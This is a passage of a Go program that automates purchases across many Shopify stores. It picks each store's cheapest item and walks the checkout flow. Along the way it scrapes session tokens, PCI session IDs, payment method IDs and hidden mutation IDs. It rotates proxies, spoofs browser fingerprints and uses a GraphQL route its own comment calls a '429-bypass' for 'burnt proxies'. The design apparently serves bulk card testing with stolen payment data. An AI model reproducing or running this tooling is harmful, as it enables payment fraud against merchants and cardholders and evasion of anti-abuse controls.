package main

import (
	"bytes"
	"compress/gzip"
	"compress/zlib"
	"encoding/json"
	"errors"
	"fmt"
	"html"
	"io"
	"math"
	"math/rand"
	"net/http"
	"net/url"
	"os"
	"path/filepath"
	"regexp"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/andybalholm/brotli"
	fhttp "github.com/bogdanfinn/fhttp"
	tls_client "github.com/bogdanfinn/tls-client"
)

const defaultShopURL = "https://gpzb9u-u9.myshopify.com"
const path = "test.txt"
const proxyPath = "px.txt"

const workingSitesAPI = "https://site-manager-production-e34e.up.railway.app/sites/working"
const maxSiteAmount = 10.0

type ProductsResponse struct {
	Products []Product `json:"products"`
}

type Product struct {
	ID       int64     `json:"id"`
	Title    string    `json:"title"`
	Variants []Variant `json:"variants"`
}

type Variant struct {
	ID        int64  `json:"id"`
	Title     string `json:"title"`
	Price     string `json:"price"`
	Available bool   `json:"available"`
}

type WorkingSite struct {
	URL    string
	Amount float64
}
func isTransientErr(err error) bool {
	if err == nil {
		return false
	}
	lower := strings.ToLower(err.Error())
	return strings.Contains(lower, "eof") || strings.Contains(lower, "connection reset") || strings.Contains(lower, "broken pipe")
}

func doWithRetry(client tls_client.HttpClient, req *fhttp.Request, maxRetries int) (*fhttp.Response, error) {
	var lastErr error
	for attempt := 0; attempt < maxRetries; attempt++ {
		resp, err := client.Do(req)
		if err != nil {
			lastErr = err
			if attempt < maxRetries-1 && isTransientErr(err) {
				time.Sleep(time.Duration(500*(attempt+1)) * time.Millisecond)
				if req.GetBody != nil {
					if body, gbErr := req.GetBody(); gbErr == nil {
						req.Body = body
					}
				}
				continue
			}
			return nil, err
		}
		if resp.StatusCode == 429 && attempt < maxRetries-1 {
			retryAfter := 0
			if ra := resp.Header.Get("Retry-After"); ra != "" {
				if secs, e := strconv.Atoi(ra); e == nil && secs > 0 {
					retryAfter = secs
				}
			}
			resp.Body.Close()
			var wait time.Duration
			if retryAfter > 0 {
				wait = time.Duration(retryAfter) * time.Second
			} else {
				wait = time.Duration(2000*(attempt+1)) * time.Millisecond
			}
			wait += time.Duration(rand.Intn(500)) * time.Millisecond
			time.Sleep(wait)
			if req.GetBody != nil {
				if body, gbErr := req.GetBody(); gbErr == nil {
					req.Body = body
				}
			}
			continue
		}
		return resp, nil
	}
	return nil, lastErr
}

type productCacheEntry struct {
	title     string
	productID string
	variantID string
	priceStr  string
	expiresAt int64
}

var productCache sync.Map
const productCacheTTL = 90 // 90 seconds

func findCheapestProduct(client tls_client.HttpClient, shopURL string) (productTitle string, productID string, variantID string, priceStr string, err error) {
	if cached, ok := productCache.Load(shopURL); ok {
		entry := cached.(productCacheEntry)
		if time.Now().Unix() < entry.expiresAt {
			return entry.title, entry.productID, entry.variantID, entry.priceStr, nil
		}
	}

	productTitle, productID, variantID, priceStr, err = findCheapestProductUncached(client, shopURL)
	if err != nil && !errors.Is(err, errDeadStore) {
		gqlTitle, gqlPID, gqlVID, gqlPrice, gqlErr := findCheapestProductViaGraphQL(client, shopURL)
		if gqlErr == nil {
			productTitle, productID, variantID, priceStr, err = gqlTitle, gqlPID, gqlVID, gqlPrice, nil
		} else {
			err = gqlErr
		}
	}
	if err == nil && productID != "" {
		productCache.Store(shopURL, productCacheEntry{
			title:     productTitle,
			productID: productID,
			variantID: variantID,
			priceStr:  priceStr,
			expiresAt: time.Now().Unix() + productCacheTTL,
		})
	}
	return
}

func findCheapestProductUncached(client tls_client.HttpClient, shopURL string) (productTitle string, productID string, variantID string, priceStr string, err error) {
	bestPrice := math.MaxFloat64
	found := false

	urlsToTry := []string{
		shopURL + "/products.json?limit=250",
		shopURL + "/products.json",
	}

	var lastStatus int
	var lastFetchErr error

	for _, reqURL := range urlsToTry {
		body, fetchErr := fetchProductPage(client, reqURL, shopURL)
		if fetchErr != nil {
			lastFetchErr = fetchErr
			lastStatus = extractStatusCode(fetchErr)
			// Dead store: skip the remaining URLs and the GraphQL fallback.
			if errors.Is(fetchErr, errDeadStore) {
				break
			}
			// If we hit a 429, the second URL will 429 too — skip straight to
			// the GraphQL fallback in findCheapestProduct.
			if lastStatus == 429 {
				break
			}
			continue
		}

		var data ProductsResponse
		if jsonErr := json.Unmarshal(body, &data); jsonErr != nil {
			continue
		}

		pageCount := len(data.Products)

		for _, p := range data.Products {
			for _, v := range p.Variants {
				if !v.Available {
					continue
				}
				price, convErr := strconv.ParseFloat(v.Price, 64)
				if convErr != nil || price <= 0 {
					continue
				}
				if price < bestPrice {
					bestPrice = price
					productTitle = p.Title
					productID = strconv.FormatInt(p.ID, 10)
					variantID = strconv.FormatInt(v.ID, 10)
					priceStr = v.Price
					found = true
				}
			}
		}

		if !found {
			continue
		}

		if pageCount < 250 {
			break
		}

		for page := 2; page <= 5; page++ {
			pageURL := shopURL + fmt.Sprintf("/products.json?limit=250&page=%d", page)
			pageBody, pageErr := fetchProductPage(client, pageURL, shopURL)
			if pageErr != nil {
				break
			}

			var pageData ProductsResponse
			if jsonErr := json.Unmarshal(pageBody, &pageData); jsonErr != nil {
				break
			}

			if len(pageData.Products) == 0 {
				break
			}

			for _, p := range pageData.Products {
				for _, v := range p.Variants {
					if !v.Available {
						continue
					}
					price, convErr := strconv.ParseFloat(v.Price, 64)
					if convErr != nil || price <= 0 {
						continue
					}
					if price < bestPrice {
						bestPrice = price
						productTitle = p.Title
						productID = strconv.FormatInt(p.ID, 10)
						variantID = strconv.FormatInt(v.ID, 10)
						priceStr = v.Price
						found = true
					}
				}
			}

			if len(pageData.Products) < 250 {
				break
			}
		}
		break
	}

	if !found {
		statusMsg := ""
		if lastStatus > 0 {
			statusMsg = fmt.Sprintf(" (last status: %d)", lastStatus)
		} else if lastFetchErr != nil {
			statusMsg = fmt.Sprintf(" (last err: %v)", lastFetchErr)
		}
		return "", "", "", "", fmt.Errorf("no available products found at %s%s", shopURL, statusMsg)
	}
	return productTitle, productID, variantID, priceStr, nil
}

// findCheapestProductViaGraphQL is the 429-bypass path. The Storefront
// Storefront-API endpoint /api/graphql is not subject to the same per-route
// throttle as /products.json, so burnt proxies can still fetch products +
// variant IDs + prices here.
func findCheapestProductViaGraphQL(client tls_client.HttpClient, shopURL string) (productTitle string, productID string, variantID string, priceStr string, err error) {
	bestPrice := math.MaxFloat64
	found := false

	// Storefront API schema: products(first:N) → edges → node → variants.
	// Returns gid://shopify/Product/<id> and gid://shopify/ProductVariant/<id>.
	// We strip the gid:// prefix to match what /cart/add.js expects (numeric IDs).
	// NOTE: brace balance is critical — extra `}` triggers
	// "Expected one of SCHEMA, SCALAR, TYPE... actual: RCURLY" parse error.
	// `quantityAvailable` requires unauthenticated_read_product_inventory scope
	// which most shops don't grant — we filter by `availableForSale` instead.
	query := `{"query":"{ products(first:250) { edges { node { id title availableForSale variants(first:10) { edges { node { id title priceV2 { amount currencyCode } } } } } } } }"}`

	req, reqErr := fhttp.NewRequest("POST", shopURL+"/api/graphql", strings.NewReader(query))
	if reqErr != nil {
		return "", "", "", "", fmt.Errorf("building graphql request: %w", reqErr)
	}
	req.Header.Set("accept", "application/json")
	req.Header.Set("accept-language", "en-US,en;q=0.9")
	req.Header.Set("content-type", "application/json")
	req.Header.Set("origin", shopURL)
	req.Header.Set("referer", shopURL+"/")
	req.Header.Set("sec-ch-ua", randomSecChUA())
	req.Header.Set("sec-ch-ua-mobile", "?0")
	req.Header.Set("sec-ch-ua-platform", `"Windows"`)
	req.Header.Set("sec-fetch-dest", "empty")
	req.Header.Set("sec-fetch-mode", "cors")
	req.Header.Set("sec-fetch-site", "same-origin")
	req.Header.Set("user-agent", randomChromeUA())

	resp, doErr := doWithRetry(client, req, 2)
	if doErr != nil {
		return "", "", "", "", fmt.Errorf("POST /api/graphql: %w", doErr)
	}
	defer resp.Body.Close()

	body, readErr := io.ReadAll(resp.Body)
	if readErr != nil {
		return "", "", "", "", fmt.Errorf("reading graphql response: %w", readErr)
	}
	if resp.StatusCode != http.StatusOK {
		return "", "", "", "", fmt.Errorf("POST /api/graphql returned status %d", resp.StatusCode)
	}

	bodyStr := string(body)
	// Detect error payload — gql errors come back as 200 with an `errors` array.
	if strings.Contains(bodyStr, `"errors"`) {
		return "", "", "", "", fmt.Errorf("graphql errors: %s", truncateForLog(bodyStr, 300))
	}

	// Parse with encoding/json — far more robust than regex on nested GraphQL.
	var gqlResp struct {
		Data struct {
			Products struct {
				Edges []struct {
					Node struct {
						ID              string `json:"id"`
						Title           string `json:"title"`
						AvailableForSale bool  `json:"availableForSale"`
						Variants struct {
							Edges []struct {
								Node struct {
									ID     string `json:"id"`
									Title  string `json:"title"`
									PriceV2 struct {
										Amount     string `json:"amount"`
										CurrencyCode string `json:"currencyCode"`
									} `json:"priceV2"`
								} `json:"node"`
							} `json:"edges"`
						} `json:"variants"`
					} `json:"node"`
				} `json:"edges"`
			} `json:"products"`
		} `json:"data"`
	}
	if jErr := json.Unmarshal(body, &gqlResp); jErr != nil {
		return "", "", "", "", fmt.Errorf("graphql parse: %w (body: %s)", jErr, truncateForLog(bodyStr, 200))
	}

	for _, edge := range gqlResp.Data.Products.Edges {
		p := edge.Node
		if !p.AvailableForSale {
			continue
		}
		pidGID := p.ID
		pidTitle := p.Title
		for _, ve := range p.Variants.Edges {
			v := ve.Node
			vidGID := v.ID
			priceVal := v.PriceV2.Amount
			price, convErr := strconv.ParseFloat(priceVal, 64)
			if convErr != nil || price <= 0 {
				continue
			}
			if price < bestPrice {
				bestPrice = price
				// Strip gid://shopify/ProductVariant/<id> → numeric id
				variantID = stripGID(vidGID)
				productID = stripGID(pidGID)
				productTitle = pidTitle
				priceStr = priceVal
				found = true
			}
		}
	}

	if !found {
		return "", "", "", "", fmt.Errorf("graphql: no available variants at %s", shopURL)
	}
	fmt.Printf("[GQL] %s fallback: variant=%s price=%s\n", shopURL, variantID, priceStr)
	return productTitle, productID, variantID, priceStr, nil
}

func truncateForLog(s string, n int) string {
	if len(s) <= n {
		return s
	}
	return s[:n] + "..."
}

// stripGID converts "gid://shopify/ProductVariant/<id>" or
// "gid://shopify/Product/<id>" to the trailing "<id>" portion.
// Returns the input unchanged if it has no slash.
func stripGID(gid string) string {
	if i := strings.LastIndex(gid, "/"); i >= 0 {
		return gid[i+1:]
	}
	return gid
}

func fetchProductPage(client tls_client.HttpClient, reqURL, shopURL string) ([]byte, error) {
	maxRetries := 5
	var lastErr error
	for attempt := 0; attempt < maxRetries; attempt++ {
		req, reqErr := fhttp.NewRequest("GET", reqURL, nil)
		if reqErr != nil {
			return nil, fmt.Errorf("building request: %w", reqErr)
		}
		req.Header.Set("accept", "application/json, text/javascript, */*; q=0.01")
		req.Header.Set("accept-language", "en-US,en;q=0.9")
		req.Header.Set("cache-control", "no-cache")
		req.Header.Set("pragma", "no-cache")
		req.Header.Set("referer", shopURL+"/")
		req.Header.Set("sec-ch-ua", randomSecChUA())
		req.Header.Set("sec-ch-ua-mobile", "?0")
		req.Header.Set("sec-ch-ua-platform", `"Windows"`)
		req.Header.Set("sec-fetch-dest", "empty")
		req.Header.Set("sec-fetch-mode", "cors")
		req.Header.Set("sec-fetch-site", "same-origin")
		req.Header.Set("user-agent", randomChromeUA())
		req.Header.Set("x-requested-with", "XMLHttpRequest")

		resp, doErr := client.Do(req)
		if doErr != nil {
			lastErr = doErr
			lower := strings.ToLower(doErr.Error())
			if attempt < maxRetries-1 && (strings.Contains(lower, "eof") || strings.Contains(lower, "connection reset") || strings.Contains(lower, "broken pipe")) {
				time.Sleep(time.Duration(500*(attempt+1)) * time.Millisecond)
				continue
			}
			return nil, fmt.Errorf("GET %s: %w", reqURL, doErr)
		}

		if resp.StatusCode == http.StatusOK {
			body, readErr := io.ReadAll(resp.Body)
			resp.Body.Close()
			if readErr != nil {
				lastErr = readErr
				lower := strings.ToLower(readErr.Error())
				if attempt < maxRetries-1 && (strings.Contains(lower, "eof") || strings.Contains(lower, "connection reset") || strings.Contains(lower, "broken pipe")) {
					time.Sleep(time.Duration(500*(attempt+1)) * time.Millisecond)
					continue
				}
				return nil, fmt.Errorf("reading body: %w", readErr)
			}
			return body, nil
		}

		statusCode := resp.StatusCode
		// Read the body so we can detect dead/inactive stores (Shopify serves a
		// "Store unavailable" page) and blacklist them instead of retrying forever.
		deadBody, readErr := io.ReadAll(resp.Body)
		resp.Body.Close()
		if readErr == nil && isDeadStoreBody(deadBody) {
			return nil, fmt.Errorf("%w: %s", errDeadStore, reqURL)
		}
		lastErr = fmt.Errorf("status %d", statusCode)

		return nil, fmt.Errorf("GET %s returned status %d", reqURL, statusCode)
	}
	if lastErr == nil {
		lastErr = fmt.Errorf("max retries exceeded")
	}
	return nil, fmt.Errorf("GET %s: max retries exceeded (last: %v)", reqURL, lastErr)
}

// isDeadStoreBody reports whether a response body is Shopify's standard
// "Store unavailable" page, which dead/inactive stores serve on every path.
// Matches the English and localized (e.g. Portuguese "Loja indisponível") titles.
func isDeadStoreBody(body []byte) bool {
	lower := strings.ToLower(string(body))
	if strings.Contains(lower, "store unavailable") {
		return true
	}
	if strings.Contains(lower, "loja indispon") {
		return true
	}
	// Fallback: the shop-404 page class used by Shopify's unavailable page.
	if strings.Contains(lower, `class="shop-404"`) {
		return true
	}
	return false
}

func extractStatusCode(fetchErr error) int {
	re := regexp.MustCompile(`status (\d+)`)
	if m := re.FindStringSubmatch(fetchErr.Error()); len(m) > 1 {
		code, _ := strconv.Atoi(m[1])
		return code
	}
	return 0
}

func addToCartAndCheckout(client tls_client.HttpClient, shopURL, variantID string) (effectiveShopURL, checkoutURL, checkoutToken, sessionToken, checkoutHTML string, err error) {
	effectiveShopURL = shopURL

	// cartAddAndFetch does POST /cart/add.js + GET /checkout on the given base URL
	// and returns the checkout response.
	cartAddAndFetch := func(baseURL string) (*fhttp.Response, error) {
		payload := fmt.Sprintf(`{"id":%s,"quantity":1}`, variantID)
		addReq, err := fhttp.NewRequest("POST", baseURL+"/cart/add.js", strings.NewReader(payload))
		if err != nil {
			return nil, fmt.Errorf("building cart request: %w", err)
		}
		addReq.Header.Set("Content-Type", "application/json")
		addReq.Header.Set("accept", "application/json")
		addReq.Header.Set("accept-language", "en-US,en;q=0.9")
		addReq.Header.Set("origin", baseURL)
		addReq.Header.Set("referer", baseURL+"/")
		addReq.Header.Set("sec-ch-ua", randomSecChUA())
		addReq.Header.Set("sec-ch-ua-mobile", "?0")
		addReq.Header.Set("sec-ch-ua-platform", `"Windows"`)
		addReq.Header.Set("sec-fetch-dest", "empty")
		addReq.Header.Set("sec-fetch-mode", "cors")
		addReq.Header.Set("sec-fetch-site", "same-origin")
		addReq.Header.Set("user-agent", randomChromeUA())

		addResp, err := doWithRetry(client, addReq, 2)
		if err != nil {
			return nil, fmt.Errorf("POST /cart/add.js: %w", err)
		}
		io.Copy(io.Discard, addResp.Body)
		addResp.Body.Close()

		if addResp.StatusCode != http.StatusOK {
			return nil, fmt.Errorf("POST /cart/add.js returned status %d", addResp.StatusCode)
		}

		randSleep(0.8, 1.5)

		checkoutReq, err := fhttp.NewRequest("GET", baseURL+"/checkout", nil)
		if err != nil {
			return nil, fmt.Errorf("building checkout request: %w", err)
		}
		checkoutReq.Header.Set("accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7")
		checkoutReq.Header.Set("accept-language", "en-US,en;q=0.9")
		checkoutReq.Header.Set("sec-ch-ua", randomSecChUA())
		checkoutReq.Header.Set("sec-ch-ua-mobile", "?0")
		checkoutReq.Header.Set("sec-ch-ua-platform", `"Windows"`)
		checkoutReq.Header.Set("sec-fetch-dest", "document")
		checkoutReq.Header.Set("sec-fetch-mode", "navigate")
		checkoutReq.Header.Set("sec-fetch-site", "same-origin")
		checkoutReq.Header.Set("upgrade-insecure-requests", "1")
		checkoutReq.Header.Set("user-agent", randomChromeUA())

		resp, err := doWithRetry(client, checkoutReq, 2)
		if err != nil {
			return nil, fmt.Errorf("GET /checkout: %w", err)
		}
		return resp, nil
	}

	resp, err := cartAddAndFetch(shopURL)
	if err != nil {
		return "", "", "", "", "", err
	}

	// Check if the checkout redirected to a different domain (myshopify.com → custom domain).
	// If so, the cart cookie was on the wrong domain — re-do cart-add + checkout on the real domain.
	finalURL := resp.Request.URL.String()
	finalBase := urlBase(finalURL)
	if finalBase != "" && finalBase != shopURL {
		resp.Body.Close()
		resp2, err2 := cartAddAndFetch(finalBase)
		if err2 != nil {
			return "", "", "", "", "", err2
		}
		resp = resp2
		effectiveShopURL = finalBase
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return "", "", "", "", "", fmt.Errorf("GET /checkout returned status %d (landed: %s)",
			resp.StatusCode, resp.Request.URL.String())
	}

	checkoutURL = resp.Request.URL.String()

	tokenRe := regexp.MustCompile(`/checkouts/cn/([^/?]+)`)
	if m := tokenRe.FindStringSubmatch(checkoutURL); len(m) > 1 {
		checkoutToken = m[1]
	}

	htmlBytes, err := io.ReadAll(resp.Body)
	if err != nil {
		return "", "", "", "", "", fmt.Errorf("reading checkout HTML: %w", err)
	}
	checkoutHTML = string(htmlBytes)

	sessionRe := regexp.MustCompile(`<meta\s+name="serialized-sessionToken"\s+content="([^"]*)"`)
	if m := sessionRe.FindStringSubmatch(checkoutHTML); len(m) > 1 {
		sessionToken = html.UnescapeString(m[1])
		sessionToken = strings.Trim(sessionToken, `"`)
	}

	return effectiveShopURL, checkoutURL, checkoutToken, sessionToken, checkoutHTML, nil
}

// urlBase extracts "https://host" from a full URL.
func urlBase(rawURL string) string {
	u, err := url.Parse(rawURL)
	if err != nil || u.Host == "" {
		return ""
	}
	return u.Scheme + "://" + u.Host
}

func extractPrivateAccessTokenID(checkoutHTML string) string {
	unescaped := html.UnescapeString(checkoutHTML)

	re := regexp.MustCompile(`"checkoutSessionIdentifier"\s*:\s*"([a-f0-9]+)"`)
	m := re.FindStringSubmatch(unescaped)
	if len(m) < 2 {
		return ""
	}

	return m[1]
}

func fetchPrivateAccessToken(client tls_client.HttpClient, shopURL, checkoutURL, patID string) (string, error) {
	reqURL := fmt.Sprintf("%s/private_access_tokens?id=%s&checkout_type=c1",
		shopURL, url.QueryEscape(patID))

	req, err := fhttp.NewRequest("GET", reqURL, nil)
	if err != nil {
		return "", fmt.Errorf("building request: %w", err)
	}

	req.Header.Set("accept", "*/*")
	req.Header.Set("accept-language", "en-US,en;q=0.9")
	req.Header.Set("referer", checkoutURL)
	req.Header.Set("sec-ch-ua", randomSecChUA())
	req.Header.Set("sec-ch-ua-mobile", "?0")
	req.Header.Set("sec-ch-ua-platform", `"Windows"`)
	req.Header.Set("sec-fetch-dest", "empty")
	req.Header.Set("sec-fetch-mode", "cors")
	req.Header.Set("sec-fetch-site", "same-origin")
	req.Header.Set("user-agent", randomChromeUA())

	resp, err := doWithRetry(client, req, 2)
	if err != nil {
		return "", fmt.Errorf("GET private_access_tokens: %w", err)
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return "", fmt.Errorf("reading response: %w", err)
	}

	return fmt.Sprintf("[%d] %s", resp.StatusCode, string(body)), nil
}

func extractActionsJSURL(checkoutHTML, shopURL string) string {
	re := regexp.MustCompile(`(/cdn/shopifycloud/checkout-web/assets/c1/actions[A-Za-z0-9_-]*\.[A-Za-z0-9_-]+\.js)`)
	m := re.FindStringSubmatch(checkoutHTML)
	if len(m) < 2 {
		return ""
	}
	return shopURL + m[1]
}

func extractProcessingJSURL(checkoutHTML, shopURL string) string {
	patterns := []string{
		`(/cdn/shopifycloud/checkout-web/assets/c1/useHasOrdersFromMultipleShops[A-Za-z0-9_.-]*\.js)`,
		`(/cdn/shopifycloud/checkout-web/assets/[A-Za-z0-9_/.-]*useHasOrdersFromMultipleShops[A-Za-z0-9_.-]*\.js)`,
		`(/cdn/shopifycloud/checkout-web/assets/c1/page-Processing[A-Za-z0-9_.-]*\.js)`,
		`(/cdn/shopifycloud/checkout-web/assets/c1/page-ThankYou[A-Za-z0-9_.-]*\.js)`,
		`(/cdn/shopifycloud/checkout-web/assets/[A-Za-z0-9_/.-]*[Pp]rocessing[A-Za-z0-9_.-]*\.js)`,
		`(/cdn/shopifycloud/checkout-web/assets/[A-Za-z0-9_/.-]*[Rr]eceipt[A-Za-z0-9_.-]*\.js)`,
	}
	for _, p := range patterns {
		re := regexp.MustCompile(p)
		m := re.FindStringSubmatch(checkoutHTML)
		if len(m) >= 2 {
			return shopURL + m[1]
		}
	}
	return ""
}

func extractProcessingJSURLs(checkoutHTML, shopURL string) []string {
	patterns := []string{
		`(/cdn/shopifycloud/checkout-web/assets/c1/useHasOrdersFromMultipleShops[A-Za-z0-9_.-]*\.js)`,
		`(/cdn/shopifycloud/checkout-web/assets/[A-Za-z0-9_/.-]*useHasOrdersFromMultipleShops[A-Za-z0-9_.-]*\.js)`,
		`(/cdn/shopifycloud/checkout-web/assets/c1/page-Processing[A-Za-z0-9_.-]*\.js)`,
		`(/cdn/shopifycloud/checkout-web/assets/c1/page-ThankYou[A-Za-z0-9_.-]*\.js)`,
		`(/cdn/shopifycloud/checkout-web/assets/[A-Za-z0-9_/.-]*[Pp]rocessing[A-Za-z0-9_.-]*\.js)`,
		`(/cdn/shopifycloud/checkout-web/assets/[A-Za-z0-9_/.-]*[Rr]eceipt[A-Za-z0-9_.-]*\.js)`,
	}
	seen := map[string]bool{}
	var urls []string
	for _, p := range patterns {
		re := regexp.MustCompile(p)
		for _, m := range re.FindAllStringSubmatch(checkoutHTML, -1) {
			if len(m) >= 2 {
				u := shopURL + m[1]
				if !seen[u] {
					seen[u] = true
					urls = append(urls, u)
				}
			}
		}
	}
	allRe := regexp.MustCompile(`(/cdn/shopifycloud/checkout-web/assets/[A-Za-z0-9_/.-]+\.js)`)
	skip := regexp.MustCompile(`(?i)(locale-|polyfills|libphonenumber|qrcodegen|getCountryCallingCode|/css/|FullScreenBackground|component-[A-Z])`)
	for _, m := range allRe.FindAllStringSubmatch(checkoutHTML, -1) {
		if len(m) >= 2 {
			u := shopURL + m[1]
			if seen[u] {
				continue
			}
			if skip.MatchString(m[1]) {
				continue
			}
			seen[u] = true
			urls = append(urls, u)
		}
	}
	return urls
}

func fetchActionsJS(client tls_client.HttpClient, actionsURL, shopURL string) (jsBody string, err error) {
	req, err := fhttp.NewRequest("GET", actionsURL, nil)
	if err != nil {
		return "", fmt.Errorf("building request: %w", err)
	}

	req.Header.Set("accept", "*/*")
	req.Header.Set("accept-language", "en-US,en;q=0.9")
	req.Header.Set("origin", shopURL)
	req.Header.Set("priority", "u=1")
	req.Header.Set("sec-ch-ua", randomSecChUA())
	req.Header.Set("sec-ch-ua-mobile", "?0")
	req.Header.Set("sec-ch-ua-platform", `"Windows"`)
	req.Header.Set("sec-fetch-dest", "script")
	req.Header.Set("sec-fetch-mode", "cors")
	req.Header.Set("sec-fetch-site", "same-origin")
	req.Header.Set("user-agent", randomChromeUA())

	resp, err := doWithRetry(client, req, 2)
	if err != nil {
		return "", fmt.Errorf("GET actions JS: %w", err)
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return "", fmt.Errorf("reading response: %w", err)
	}

	if resp.StatusCode != http.StatusOK {
		return "", fmt.Errorf("GET actions JS returned status %d", resp.StatusCode)
	}

	return string(body), nil
}

func extractProposalID(jsBody string) string {
	re := regexp.MustCompile(`id:\s*"([a-f0-9]{64})"\s*,\s*type:\s*"query"\s*,\s*name:\s*"Proposal"`)
	m := re.FindStringSubmatch(jsBody)
	if len(m) < 2 {
		return ""
	}
	return m[1]
}

func extractSubmitForCompletionID(jsBody string) string {
	re := regexp.MustCompile(`id:\s*"([a-f0-9]{64})"\s*,\s*type:\s*"mutation"\s*,\s*name:\s*"SubmitForCompletion"`)
	m := re.FindStringSubmatch(jsBody)
	if len(m) < 2 {
		return ""
	}
	return m[1]
}

func extractPollForReceiptID(jsBody string) string {
	patterns := []string{
		`id:\s*"([a-f0-9]{64})"\s*,\s*type:\s*"query"\s*,\s*name:\s*"PollForReceipt"`,
		`name:\s*"PollForReceipt"\s*,\s*type:\s*"query"\s*,\s*id:\s*"([a-f0-9]{64})"`,
		`"PollForReceipt"[^}]{0,200}id:\s*"([a-f0-9]{64})"`,
		`id:\s*"([a-f0-9]{64})"[^}]{0,200}"PollForReceipt"`,
		`id:\s*'([a-f0-9]{64})'\s*,\s*type:\s*'query'\s*,\s*name:\s*'PollForReceipt'`,
		`PollForReceipt.{0,300}?([a-f0-9]{64})`,
		`([a-f0-9]{64}).{0,300}?PollForReceipt`,
	}
	for _, p := range patterns {
		re := regexp.MustCompile(p)
		m := re.FindStringSubmatch(jsBody)
		if len(m) >= 2 {
			return m[1]
		}
	}
	return ""
}

func extractReceiptID(submitBody string) string {
	re := regexp.MustCompile(`"id"\s*:\s*"(gid://shopify/ProcessedReceipt/[0-9a-zA-Z]+)"`)
	m := re.FindStringSubmatch(submitBody)
	if len(m) < 2 {
		return ""
	}
	return m[1]
}

func extractReceiptSessionToken(submitBody string) string {
	re := regexp.MustCompile(`"sessionToken"\s*:\s*"([^"]+)"`)
	m := re.FindStringSubmatch(submitBody)
	if len(m) < 2 {
		return ""
	}
	return m[1]
}

func extractStableID(checkoutHTML string) string {
	unescaped := html.UnescapeString(checkoutHTML)
	re := regexp.MustCompile(`"stableId"\s*:\s*"([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})"`)
	m := re.FindStringSubmatch(unescaped)
	if len(m) < 2 {
		return ""
	}
	return m[1]
}

func extractCommitSha(checkoutHTML string) string {
	unescaped := html.UnescapeString(checkoutHTML)
	re := regexp.MustCompile(`"commitSha"\s*:\s*"([a-f0-9]{40})"`)
	m := re.FindStringSubmatch(unescaped)
	if len(m) < 2 {
		return ""
	}
	return m[1]
}

func extractSourceToken(checkoutHTML string) string {
	re := regexp.MustCompile(`<meta\s+name="serialized-sourceToken"\s+content="([^"]*)"`)
	m := re.FindStringSubmatch(checkoutHTML)
	if len(m) < 2 {
		return ""
	}
	val := html.UnescapeString(m[1])
	return strings.Trim(val, `"`)
}

func extractIdentificationSignature(checkoutHTML string) string {
	unescaped := html.UnescapeString(checkoutHTML)
	re := regexp.MustCompile(`checkoutCardsinkCallerIdentificationSignature":"([^"]+)"`)
	m := re.FindStringSubmatch(unescaped)
	if len(m) < 2 {
		return ""
	}
	return m[1]
}

func extractPCISessionID(pciBody string) string {
	re := regexp.MustCompile(`"id"\s*:\s*"([^"]+)"`)
	m := re.FindStringSubmatch(pciBody)
	if len(m) < 2 {
		return ""
	}
	return m[1]
}

func extractDeliveryHandle(proposalBody string) string {
	re := regexp.MustCompile(`"selectedDeliveryStrategy"\s*:\s*\{"handle"\s*:\s*"([^"]+)"\s*,\s*"__typename"\s*:\s*"CompleteDeliveryStrategy"`)
	m := re.FindStringSubmatch(proposalBody)
	if len(m) < 2 {
		return ""
	}
	return m[1]
}

func extractSignedHandles(proposalBody string) []string {
	re := regexp.MustCompile(`"signedHandle"\s*:\s*"([^"]+)"`)
	matches := re.FindAllStringSubmatch(proposalBody, -1)
	var handles []string
	for _, m := range matches {
		if len(m) >= 2 {
			handles = append(handles, m[1])
		}
	}
	return handles
}

func extractPaymentMethodID(proposalBody string) string {
	re := regexp.MustCompile(`"paymentMethodIdentifier"\s*:\s*"([^"]+)"\s*,\s*"name"\s*:\s*"shopify_payments"`)
	m := re.FindStringSubmatch(proposalBody)
	if len(m) < 2 {
		return ""
	}
	return m[1]
}

func extractShippingAmount(proposalBody string) string {
	re := regexp.MustCompile(`"__typename"\s*:\s*"CompleteDeliveryStrategy"\}\]\s*,\s*"__typename"\s*:\s*"DeliveryLine"\}`)
	re2 := regexp.MustCompile(`"deliveryStrategyBreakdown"\s*:\s*\[\s*\{\s*"amount"\s*:\s*\{\s*"value"\s*:\s*\{\s*"amount"\s*:\s*"([^"]+)"`)
	m := re2.FindStringSubmatch(proposalBody)
	if len(m) < 2 {
		_ = re
		return ""
	}
	return m[1]
}

// readResponseBody reads resp.Body and transparently decompresses gzip/deflate/br
// based on the Content-Encoding response header. This is required because manually
// setting Accept-Encoding disables fhttp's automatic decompression. The caller is
// still responsible for closing resp.Body.
//
// Resilient: if the server reports Content-Encoding but the body isn't actually
// compressed (e.g. the transport already decompressed it, or a proxy lied about
// the encoding), we detect this via magic-byte sniffing and return the raw bytes
// instead of failing. This matches the behavior of Python's requests library.
func readResponseBody(resp *fhttp.Response) ([]byte, error) {
	raw, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, err
	}
	switch strings.ToLower(strings.TrimSpace(resp.Header.Get("Content-Encoding"))) {
	case "gzip":
		// gzip magic: 0x1f 0x8b. If absent, the body is already decompressed.
		if len(raw) >= 2 && raw[0] == 0x1f && raw[1] == 0x8b {
			gr, gzErr := gzip.NewReader(bytes.NewReader(raw))
			if gzErr != nil {
				return raw, nil
			}
			defer gr.Close()
			return io.ReadAll(gr)
		}
		return raw, nil
	case "deflate":
		// zlib stream: first byte is 0x78 (CMF with CINFO=7, FCHECK makes it 0x78/0x9c/0xda).
		if len(raw) >= 2 && raw[0] == 0x78 {
			zr, zErr := zlib.NewReader(bytes.NewReader(raw))
			if zErr != nil {
				return raw, nil
			}
			defer zr.Close()
			return io.ReadAll(zr)
		}
		return raw, nil
	case "br":
		// brotli has no simple magic bytes; trust the header but fall back on decode error.
		decoded, dErr := io.ReadAll(brotli.NewReader(bytes.NewReader(raw)))
		if dErr != nil {
			return raw, nil
		}
		return decoded, nil
	default:
	}
	return raw, nil
}

// sellerProposalSection returns the substring of a proposal response starting
// at the "sellerProposal" key. The buyerProposal (which precedes sellerProposal)
// echoes the buyer's "totalAmount: {any: true}" back as runningTotal: 0.0, so
